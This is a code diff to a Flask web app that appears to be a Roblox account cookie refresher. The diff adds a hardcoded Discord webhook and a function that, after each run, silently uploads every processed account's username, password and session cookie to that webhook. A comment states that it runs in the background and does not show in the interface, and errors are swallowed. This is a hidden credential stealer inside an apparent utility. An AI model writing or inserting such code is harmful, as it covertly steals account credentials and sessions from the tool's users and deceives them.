@@ -1,5 +1,6 @@
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from datetime import datetime
+import io
 import json
 import os
 import queue
@@ -10,6 +11,9 @@ from flask import Flask, Response, render_template, request, stream_with_context
 import requests
 
 app = Flask(__name__)
+
+# Cấu hình Discord Webhook trực tiếp tại đây (chạy ngầm, không xuất ra UI)
+DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1575353201798946956/X3229l9zhS-BASB2LcwtO5dN76HF8b2U6nCXcEFAFOWpKqTAkcXdUgLWQlSu3Z_inKmS"
 
 LOGOUT_URL = "https://auth.roblox.com/v2/logout"
 TICKET_URL = "https://auth.roblox.com/v1/authentication-ticket"
@@ -74,6 +78,25 @@ class Bypass:
         return new_cookie
 
 
+def send_refreshed_to_webhook_silent(content: str, ok_count: int, total_count: int) -> None:
+    url = (DISCORD_WEBHOOK_URL or "").strip()
+    if not url or not content.strip():
+        return
+
+    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
+    filename = f"output_refreshed_{ts}.txt"
+    payload = {
+        "content": f"Refresh cookie hoàn tất: **{ok_count}/{total_count}** acc thành công."
+    }
+    files = {
+        "file": (filename, io.BytesIO(content.encode("utf-8")), "text/plain; charset=utf-8")
+    }
+    try:
+        requests.post(url, data={"payload_json": json.dumps(payload)}, files=files, timeout=20)
+    except Exception:
+        pass
+
+
 def normalize_proxy(raw: str) -> str:
     raw = raw.strip()
     if not raw or raw.startswith("#"):
@@ -136,6 +159,9 @@ def api_refresh():
 
         q = queue.Queue()
         total = len(accounts)
+        out_lines = []
+        ok_counter = 0
+        state_lock = threading.Lock()
 
         def push(ev_type, **kw):
             kw["type"] = ev_type
@@ -143,11 +169,19 @@ def api_refresh():
             q.put(kw)
 
         def worker(u, p, c):
+            nonlocal ok_counter
             user, password, new_cookie, err = refresh_one(u, p, c, proxies)
             if err is None:
-                push("success", username=user, line=f"{user}:{password}:{new_cookie}", msg="Refreshed OK")
+                line = f"{user}:{password}:{new_cookie}"
+                with state_lock:
+                    ok_counter += 1
+                    out_lines.append(line)
+                push("success", username=user, line=line, msg="Refreshed OK")
             else:
                 fail_line = f"{user}:{password}:{c}" if keep_failed else f"{user}:{password}:{c} | {err}"
+                if keep_failed:
+                    with state_lock:
+                        out_lines.append(fail_line)
                 push("fail", username=user, line=fail_line, keep=keep_failed, msg=err)
 
         def runner():
@@ -160,6 +194,12 @@ def api_refresh():
                         f.result()
                     except Exception as e:
                         push("log", msg=f"Thread error: {e}")
+
+            with state_lock:
+                joined_out = "\n".join(out_lines)
+                ok_total = ok_counter
+
+            send_refreshed_to_webhook_silent(joined_out, ok_total, total)
             push("done")
 
         threading.Thread(target=runner, daemon=True).start()
